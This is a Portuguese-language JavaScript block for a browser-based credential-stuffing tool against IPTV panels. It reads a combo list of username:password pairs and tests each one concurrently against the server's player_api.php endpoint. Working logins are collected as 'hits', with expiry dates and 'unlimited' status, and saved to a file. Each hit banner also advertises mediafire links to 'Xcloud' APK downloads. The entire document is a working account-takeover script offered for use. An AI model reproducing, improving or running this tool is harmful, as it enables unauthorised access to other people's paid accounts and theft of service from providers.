<script>
'use strict';
let hits = [];
let hitCount = 0;
let hitIlimitadas = 0;
let combos = [];
let scanParado = false;
let servidorAtual = "";
let totalCombos = 0;
let feitos = 0;

// ==== Helpers de velocidade e expiração ====
const TIMEOUT_MS = 8000; // timeout por requisição

async function fetchJsonWithTimeout(url, ms = TIMEOUT_MS) {
  const ctrl = new AbortController();
  const id = setTimeout(() => ctrl.abort(), ms);
  try {
    const res = await fetch(url, { signal: ctrl.signal });
    if (!res.ok) throw new Error("HTTP " + res.status);
    const ct = res.headers.get("content-type") || "";
    if (!ct.includes("application/json")) {
      // tenta mesmo assim
      return await res.json().catch(() => ({}));
    }
    return await res.json();
  } finally {
    clearTimeout(id);
  }
}

function parseExpDate(info) {
  const raw = (info && info.exp_date !== undefined) ? info.exp_date : null;
  const now = new Date();
  let ilimitada = false;
  let expDate = null;

  if (raw === null || raw === undefined || raw === "" || raw === 0 || raw === "0") {
    ilimitada = true;
  } else if (typeof raw === "string" && /(unlimited|ilimitad|never|nunca|sem\s*limite|sem\s*expir|lifetime)/i.test(raw)) {
    ilimitada = true;
  } else {
    const n = Number(raw);
    if (!Number.isNaN(n) && n > 0) {
      expDate = new Date(n * 1000);
    } else {
      const tryDate = new Date(raw);
      if (!Number.isNaN(tryDate.getTime())) expDate = tryDate;
    }
  }

  const diasRestantes = expDate ? Math.max(0, Math.ceil((expDate - now) / (1000*60*60*24))) : (ilimitada ? "∞" : "N/A");
  const expiraStr = expDate ? expDate.toLocaleDateString() : (ilimitada ? "♾️ ILIMITADA" : "N/A");

  return { expiraStr, diasRestantes, ilimitada, expDate };
}

function pararScan() {
  scanParado = true;
  feitos = 0; servidorAtual = "";
  document.getElementById("servidorStatus").innerText = "Aguardando...";
  document.getElementById("comboStatus").innerText = "---";
  document.getElementById("progressStatus").innerText = "0/0 (0%)";
  document.getElementById("barraPreenchida").style.width = "0%";
  document.getElementById("barraPreenchida").innerText = "0%";
}

function salvarHits() {
  if (hits.length === 0) { alert("Nenhum hit encontrado."); return; }
  const nomeServidor = servidorAtual.replace(/https?:\/\//, '').replace(/[.:/]/g, '_');
  const blob = new Blob([hits.join("\n\n")], { type: 'text/plain' });
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = `HITS PROVEDOR XCLOUD - ${document.getElementById('provedor')?.value || 'Desconhecido'}.txt`;
  link.click();
}

async function startScan() {
  try {
    scanParado = false;
    hits = []; hitCount = 0; feitos = 0;
    document.getElementById("hitsStatus").innerText = "0";
    document.getElementById("hitsBox").innerText = "";

    const servidor = document.getElementById("servidor").value.trim();
    const comboFile = document.getElementById("combo").files[0];
    const nick = document.getElementById("nick").value.trim() || "Desconhecido";
    const bots = parseInt(document.getElementById("qtdBots").value);

    if (!servidor) { alert("Escolha um servidor!"); return; }
    if (!comboFile) { alert("Selecione seu combo.txt!"); return; }

    servidorAtual = servidor;
    const provedorSelecionado = document.getElementById("provedor").value || "Desconhecido";
    document.getElementById("servidorStatus").innerText = provedorSelecionado;

    const comboTexto = await comboFile.text();
    combos = comboTexto.split(/\r?\n/).filter(l => l.includes(":"))
                       .map(c => c.trim()).filter(Boolean);

    totalCombos = combos.length;
    if (totalCombos === 0) { alert("Combo vazio ou inválido."); return; }

    document.getElementById("progressStatus").innerText = `0/${totalCombos} (0%)`;
    document.getElementById("barraPreenchida").style.width = "0%";
    document.getElementById("barraPreenchida").innerText = "0%";

    const tarefas = [...combos];

    async function worker() {
      while (tarefas.length && !scanParado) {
        const combo = tarefas.shift();
        const [user, pass] = combo.split(":");
        document.getElementById("comboStatus").innerText = combo;

        try {
          const data = await fetchJsonWithTimeout(`${servidor}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`);
          const info = data?.user_info || {};

          const status = (info.status || "").toString().toLowerCase();
          const canais = (data?.num_channels) ?? (data?.available_channels?.length) ?? (data?.live_streams?.length) ?? (data?.channels?.length) ?? 0;
          const filmes = (data?.num_movies)   ?? (data?.available_movies?.length)  ?? (data?.movie_streams?.length) ?? (data?.movies?.length)  ?? 0;
          const series = (data?.num_series)   ?? (data?.available_series?.length)  ?? (data?.series_list?.length)   ?? (data?.series?.length)  ?? 0;

          // Expiração / ilimitada
          const { expiraStr, diasRestantes, ilimitada } = parseExpDate(info);

          const ehHit = (
            ["active", "1", "true", "ativo", "activa", "valid"].includes(status) ||
            canais > 0 || filmes > 0 || series > 0 ||
            ilimitada || (diasRestantes !== "N/A" && diasRestantes > 0)
          );

          if (ehHit) {
            const criada = info.created_at ? new Date(info.created_at * 1000).toLocaleDateString() : "N/A";
            const statusConta = (info.status || "").toString().toLowerCase() === "active" ? "✅ ATIVA" : "❌ INATIVA";

            const resultado = `╭━━━━━━━╮
┃⚜️ XCLOUD J-APK 👑
╰━━━━━━━╯
┃👤Usuario ➤ ${user}
┃🔐Senha ➤ ${pass}
┃📆Criada ➤ ${criada}
┃📆Vence ➤ ${expiraStr}
┃♾️Conta ➤ ${ilimitada ? 'ILIMITADA' : 'Limitada'}
┃⏳Resta ➤ ${diasRestantes === '∞' ? '∞ DIAS' : diasRestantes + ' DIAS'}
┃📡Status ➤ ${statusConta}
┃🔗Conexões ➤ ${info.max_connections || 'N/A'}
┃📺Provedor ➤ ${document.getElementById('provedor').value || 'Desconhecido'}
┃👺Hit by ➤ ${nick}
╰──────
╭━━━━━━━╮
┃📥 Xcloud mobile 
┃https://www.mediafire.com/file/vic0701oib61cfv/xcloud_mobile.apk/file
┃
⬇️ Xcloud Tv box 
https://www.mediafire.com/file/twlgb6jwsekka4k/xcloud.apk/file
╰━━━━━━━`;

            if (!hits.includes(resultado)) {
              hits.push(resultado);
              document.getElementById("hitsBox").textContent += resultado + "\n\n";
              hitCount++; document.getElementById("hitsStatus").innerText = hitCount;
              if (ilimitada) { hitIlimitadas++; document.getElementById('hitsIlimitadas').innerText = hitIlimitadas; }
            }
          }
        } catch (e) {
          // ignora timeout/erros de servidor para maximizar velocidade
        }

        feitos++;
        const porcentagem = Math.floor((feitos / totalCombos) * 100);
        document.getElementById("progressStatus").innerText = `${feitos}/${totalCombos} (${porcentagem}%)`;
        document.getElementById("barraPreenchida").style.width = `${porcentagem}%`;
        document.getElementById("barraPreenchida").innerText = `${porcentagem}%`;
      }
    }

    const workers = Array.from({ length: bots }, () => worker());
    await Promise.all(workers);

    document.getElementById("comboStatus").innerText = "✔️ Scan Finalizado";
    scanParado = true;
  } catch (e) {
    alert("Erro no scan: " + (e && e.message ? e.message : e));
    console.error(e);
  }
}
</script>
